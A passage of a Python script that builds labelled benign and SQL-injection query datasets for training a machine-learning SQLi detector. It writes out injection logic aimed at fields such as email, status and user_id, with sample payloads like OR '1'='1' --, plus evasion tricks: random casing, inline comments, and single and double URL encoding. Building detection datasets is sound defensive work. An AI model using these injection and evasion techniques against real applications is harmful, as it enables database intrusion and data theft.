    lambda: "false",
]

def inject_sqli(query: str) -> str:
    """Inject SQLi payload into a benign query at an appropriate injection point.
    
    Prioritizes realistic user-controlled fields:
    - email LIKE '%{input}%'
    - user_id = {input}
    - status = '{input}'
    - first_name LIKE '%{input}%'
    - etc.
    """
    payload = pick_sqli_payload()
    
    # Priority 1: Target user-controlled fields (most realistic attack vectors)
    # Look for LIKE patterns on email, name fields
    like_patterns = [
        (r"email\s+LIKE\s+'%[^']*%'", "email"),
        (r"first_name\s+LIKE\s+'%[^']*%'", "first_name"),
        (r"last_name\s+LIKE\s+'%[^']*%'", "last_name"),
        (r"name\s+LIKE\s+'%[^']*%'", "name"),
    ]
    
    for pattern, field_name in like_patterns:
        match = re.search(pattern, query, re.IGNORECASE)
        if match:
            original = match.group()
            start, end = match.span()
            # Inject into the LIKE pattern: email LIKE '%alice' OR '1'='1' --%'
            injected = original[:-2] + payload + "'%'"
            return query[:start] + injected + query[end:]
    
    # Priority 2: Target status fields (common user input in filters)
    status_patterns = [
        r"status\s*=\s*'[^']+'",
        r"order_status\s*=\s*'[^']+'",
        r"ticket_status\s*=\s*'[^']+'",
        r"payment_status\s*=\s*'[^']+'",
    ]
    
    for pattern in status_patterns:
        match = re.search(pattern, query, re.IGNORECASE)
        if match:
            original = match.group()
            start, end = match.span()
            # Inject: status = 'active' OR '1'='1'
            injected = original[:-1] + payload + "'"
            return query[:start] + injected + query[end:]
    
    # Priority 3: Target user_id/order_id (numeric user input from URL params)
    id_patterns = [
        (r"user_id\s*=\s*(\d+)", "numeric"),
        (r"order_id\s*=\s*(\d+)", "numeric"),
        (r"product_id\s*=\s*(\d+)", "numeric"),
    ]
    
    for pattern, inject_type in id_patterns:
        match = re.search(pattern, query, re.IGNORECASE)
        if match:
            num_start = match.start(1)
            num_end = match.end(1)
            # Inject after numeric: user_id = 123 OR 1=1--
            clean_payload = payload.lstrip("'")
            return query[:num_end] + " " + clean_payload + query[num_end:]
    
    # Priority 4: Other quoted string values (fallback)
    quoted_pattern = r"'(?:[^']|'')*'"
    matches = list(re.finditer(quoted_pattern, query))
    
    if matches:
        # Prefer matches near WHERE clause
        where_pos = query.upper().find('WHERE')
        if where_pos > 0:
            # Filter matches after WHERE
            where_matches = [m for m in matches if m.start() > where_pos]
            if where_matches:
                matches = where_matches
        
        # Pick a random quoted string from filtered set
        match = random.choice(matches)
        original = match.group()
        start, end = match.span()
        
        # Remove the closing quote and append payload
        injected_value = original[:-1] + payload + "'"
        return query[:start] + injected_value + query[end:]
    
    # Priority 5: Numeric value in WHERE clause (last resort)
    where_match = re.search(r'WHERE\s+\w+\s*=\s*(\d+)', query, re.IGNORECASE)
    if where_match:
        num_start = where_match.start(1)
        num_end = where_match.end(1)
        return query[:num_end] + " " + payload.lstrip("' ") + query[num_end:]
    
    # Fallback: append to end of query before semicolon
    if query.rstrip().endswith(';'):
        return query.rstrip()[:-1] + " " + payload + ";"
    else:
        return query + " " + payload

def apply_random_obfuscation(payload: str) -> str:
    """Apply additional random obfuscation to a payload.
    
    This adds another layer of obfuscation on top of the pre-defined
    obfuscated payloads, making the dataset more challenging.
    """
    obfuscation_funcs = [
        # Random case changes
        lambda p: ''.join(
            c.upper() if random.random() > 0.5 else c.lower() 
            if c.isalpha() else c for c in p
        ),
        # Add random whitespace
        lambda p: re.sub(r'(\s+)', lambda m: ' ' * random.randint(1, 3), p),
        # Add inline comments between words
        lambda p: re.sub(r'\s+', lambda m: '/**/' if random.random() > 0.5 else ' ', p),
        # Keep as-is sometimes
        lambda p: p,
    ]
    
    return random.choice(obfuscation_funcs)(payload)

def generate_one_benign() -> str:
    """Generate a single benign sample.
    
    Distribution (for attack signature generalization):
    - 65% normal SQL queries (SELECT, INSERT, UPDATE)
    - 20% hard negatives (SQL that looks suspicious but is safe)
    - 10% benign noise (non-SQL inputs that should NOT trigger detection)
    - 5% other SQL (remaining quota)
    """
    r = random.random()
    
    if r < 0.60:
        # Standard SQL queries
        inner = random.random()
        if inner < 0.85:  # SELECT dominant
            return random.choice(select_t)()
        elif inner < 0.93:
            return random.choice(insert_t)()
        else:
            return random.choice(update_t)()
    
    elif r < 0.80:
        # Hard negatives (queries that look suspicious but are benign)
        # Crucial for reducing false positives on legitimate OR/UNION/comments
        return random.choice(HARD_NEGATIVE_TEMPLATES)()
    
    elif r < 0.90:
        # Benign noise patterns (non-SQL inputs)
        # Teaches model to recognize attack SIGNATURES, not just "is SQL"
        return random.choice(BENIGN_NOISE_PATTERNS)()
    
    else:
        # Remaining SQL variety
        return random.choice(select_t)()

def generate_one_malicious() -> str:
    """Generate a malicious sample in various contexts for better model generalization.
    
    Contexts:
    - full_query (50%): Inject payload into a benign query (current behavior)
    - standalone (20%): Raw payload only (teaches raw attack pattern recognition)
    - fragment (15%): Injection fragment like it would appear in user input
    - encoded (15%): URL-encoded version of payload
    """
    payload = pick_sqli_payload()
    r = random.random()
    
    if r < 0.50:
        # Full query injection (original behavior)
        benign = generate_one_benign()
        malicious = inject_sqli(benign)
        # 30% chance to apply additional random obfuscation
        if random.random() < 0.30:
            malicious = apply_random_obfuscation(malicious)
        return malicious
    
    elif r < 0.70:
        # Standalone payload - raw attack pattern
        # May apply random obfuscation
        if random.random() < 0.30:
            payload = apply_random_obfuscation(payload)
        return payload
    
    elif r < 0.85:
        # Fragment context - simulates user input field values
        # These are what WAFs typically receive before query construction
        fragment_styles = [
            lambda p: p,  # Raw payload as-is
            lambda p: f"'{p}",  # Single quote prefix
            lambda p: f"\"{p}",  # Double quote prefix  
            lambda p: f"1{p}",  # Numeric prefix
            lambda p: f"admin{p}",  # Username-like prefix
            lambda p: f"test@email.com{p}",  # Email-like prefix
            lambda p: f"search_query{p}",  # Search term prefix
        ]
        return random.choice(fragment_styles)(payload)
    
    else:
        # URL-encoded context - common in web requests
        encoded = url_encode_payload(payload)
        # Sometimes double-encode for evasion
        if random.random() < 0.20:
            encoded = url_encode_payload(encoded)
        return encoded


def url_encode_payload(payload: str) -> str:
    """URL-encode a payload with varying levels of encoding.
    
    Randomly encodes some characters to simulate real-world evasion techniques.
    """
    # Characters to potentially encode
    encode_map = {
        ' ': '%20',
        "'": '%27',
        '"': '%22',
        '=': '%3D',
        '<': '%3C',
        '>': '%3E',
        '#': '%23',
        ';': '%3B',
        '/': '%2F',
        '\\': '%5C',
        '-': '%2D',
        '(': '%28',
        ')': '%29',
        '*': '%2A',
        '+': '%2B',
    }
    
    result = []
    for c in payload:
        # 50% chance to encode if character is in encode_map
        if c in encode_map and random.random() < 0.50:
            result.append(encode_map[c])
        else:
            result.append(c)
    
    return ''.join(result)

def generate_queries(mode: str, count: int) -> list:
    """Generate queries based on mode (benign or malicious)."""
    queries = []
    seen = set()
    
    generator = generate_one_benign if mode == "benign" else generate_one_malicious
    
    while len(queries) < count:
        s = generator().strip()
        # Replace newlines and multiple spaces with single space
        s = ' '.join(s.split())
        if s not in seen:
            seen.add(s)
            queries.append(s)
    
    return queries


def generate_dataset_split(total_per_class: int, output_dir: str = "dataset"):
    """Generate train/test/val splits with 80/10/10 ratio.
    
    Creates folder structure:
        dataset/
            train/
                benign.txt (80% of total)
                malicious.txt (80% of total)
            test/
                benign.txt (10% of total)
                malicious.txt (10% of total)
            val/
                benign.txt (10% of total)
                malicious.txt (10% of total)
    
    Args:
        total_per_class: Total number of queries PER CLASS (benign and malicious each)
        output_dir: Base output directory (default: 'dataset')
    """
    import os
    
    # Calculate split sizes
    train_count = int(total_per_class * 0.80)
    test_count = int(total_per_class * 0.10)
    val_count = total_per_class - train_count - test_count  # Remaining goes to val
    
    splits = {
        "train": train_count,
        "test": test_count,
        "val": val_count
    }
    
    print(f"=" * 60)
    print(f"Dataset Generation Configuration")
    print(f"=" * 60)
    print(f"Total queries per class: {total_per_class:,}")
    print(f"Train (80%): {train_count:,} benign + {train_count:,} malicious = {train_count * 2:,}")
    print(f"Test  (10%): {test_count:,} benign + {test_count:,} malicious = {test_count * 2:,}")
    print(f"Val   (10%): {val_count:,} benign + {val_count:,} malicious = {val_count * 2:,}")
    print(f"Total files: {total_per_class * 2:,} queries")
    print(f"Output directory: {output_dir}")
    print(f"=" * 60)
    
    # Clean up existing files and create directory structure
    import shutil
    
    for split in splits.keys():
        split_dir = os.path.join(output_dir, split)
        
        # Delete existing directory contents if it exists
        if os.path.exists(split_dir):
            print(f"Cleaning up existing files in {split_dir}...")
            shutil.rmtree(split_dir)
        
        # Create fresh directory
        os.makedirs(split_dir, exist_ok=True)
    
    seed_base = 42  # Use different seeds for each split to ensure diversity
    
    for split_name, count in splits.items():
        split_dir = os.path.join(output_dir, split_name)
        
        for mode in ["benign", "malicious"]:
            # Set unique seed for each split/mode combination
            seed = seed_base + (hash(split_name) % 10000) + (1000 if mode == "malicious" else 0)
            random.seed(seed)
            
            output_file = os.path.join(split_dir, f"{mode}.txt")
            
            print(f"\nGenerating {count:,} {mode} queries for {split_name}... (seed={seed})")
            queries = generate_queries(mode, count)
            
            with open(output_file, "w", encoding="utf-8") as f:
                for line in queries:
                    f.write(line + "\n")
            
            print(f"  ✓ Wrote {len(queries):,} queries to {output_file}")
    
    print(f"\n" + "=" * 60)
    print(f"Dataset generation complete!")
    print(f"=" * 60)
    
    # Print summary
    total_files = 0
    for split_name in splits.keys():
        split_dir = os.path.join(output_dir, split_name)
        for mode in ["benign", "malicious"]:
            file_path = os.path.join(split_dir, f"{mode}.txt")
            with open(file_path, "r", encoding="utf-8") as f:
                line_count = sum(1 for _ in f)
                total_files += line_count
                print(f"  {file_path}: {line_count:,} lines")
    
    print(f"\nTotal: {total_files:,} queries across all files")


def main():
    import sys
    import os
    
    # Check if called with just a number (dataset generation mode)
    if len(sys.argv) == 2 and sys.argv[1].isdigit():
        total_per_class = int(sys.argv[1])
        
        # Find the dataset folder relative to script location
        script_dir = os.path.dirname(os.path.abspath(__file__))
        parent_dir = os.path.dirname(script_dir)
        output_dir = os.path.join(parent_dir, "dataset")
        
        generate_dataset_split(total_per_class, output_dir)
        return
    
    # Original argparse-based CLI
    parser = argparse.ArgumentParser(
        description="Generate SQL queries for ML-based SQLi detection training.",
        epilog="""Examples:
  python sql_query_generator.py 200000          # Generate 80/10/10 split dataset
  python sql_query_generator.py --benign -n 10000  # Generate 10000 benign queries
  python sql_query_generator.py --malicious -n 5000  # Generate 5000 malicious queries
"""
    )
    
    mode_group = parser.add_mutually_exclusive_group(required=True)
    mode_group.add_argument(
        "--benign", "-b",
        action="store_true",
        help="Generate benign (clean) SQL queries"
    )
    mode_group.add_argument(
        "--malicious", "-m",
        action="store_true",
        help="Generate malicious (SQLi-infected) SQL queries"
    )
    
    parser.add_argument(
        "-n", "--count",
        type=int,
        default=N,
        help=f"Number of queries to generate (default: {N})"
    )
    parser.add_argument(
        "-o", "--output",
        type=str,
        default=None,
        help="Output file path (default: benign_sql_N.txt or malicious_sql_N.txt)"
    )
    
    args = parser.parse_args()
    
    # Determine mode and output file
    mode = "benign" if args.benign else "malicious"
    output_file = args.output or f"{mode}_sql_{args.count}.txt"
    
    print(f"Generating {args.count} {mode} SQL queries...")
    queries = generate_queries(mode, args.count)
    
    with open(output_file, "w", encoding="utf-8") as f:
        for line in queries:
            f.write(line + "\n")
    
    print(f"Wrote {len(queries)} {mode} SQL queries to {output_file}")
    print(f"\nPreview (first 25):")
    for i in range(min(25, len(queries))):
        print(queries[i])


if __name__ == "__main__":
    main()

